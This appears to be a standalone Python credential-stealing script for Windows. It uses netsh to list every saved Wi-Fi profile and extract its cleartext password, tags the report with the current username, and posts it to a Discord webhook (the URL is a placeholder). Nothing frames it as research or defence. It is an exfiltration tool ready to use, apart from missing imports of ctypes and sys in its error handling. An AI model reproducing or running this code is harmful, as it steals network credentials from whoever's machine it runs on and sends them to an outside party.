import subprocess
import re
import requests
import getpass

WEBHOOK_URL = "WEBHOOK_URL"

def get_wifi_profiles():
    try:
        # Captures the output of the command
        profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data)
        return profiles
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, f"Error getting Wi-Fi profiles: {str(e)}", "Error", 0)
        sys.exit(1)

def get_wifi_password(profile):
    try:
        # Captures the output of the command
        profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8')
        password = re.search(r"Key Content\s*:\s*(.*)", profile_info)
        return password.group(1) if password else None
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, f"Error getting Wi-Fi password for {profile}: {str(e)}", "Error", 0)
        sys.exit(1)

def send_to_discord(message):
    try:
        data = {"content": message}
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Message successfully sent to Discord.")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, f"Error sending message to Discord: {str(e)}", "Error", 0)
        sys.exit(1)

def main():
    username = getpass.getuser()
    profiles = get_wifi_profiles()
    
    if profiles:
        message = f"**Wi-Fi Report from {username}**:\n"
        for profile in profiles:
            message += f"Wi-Fi Network: {profile}\n"
            password = get_wifi_password(profile)
            if password:
                message += f"Password: {password}\n"
            else:
                message += "Password not found or the network has no password.\n"
            message += "\n"
        
        send_to_discord(message)
    else:
        send_to_discord(f"**Wi-Fi Report from {username}**\n\nNo saved Wi-Fi profiles found.")

if __name__ == "__main__":
    main()
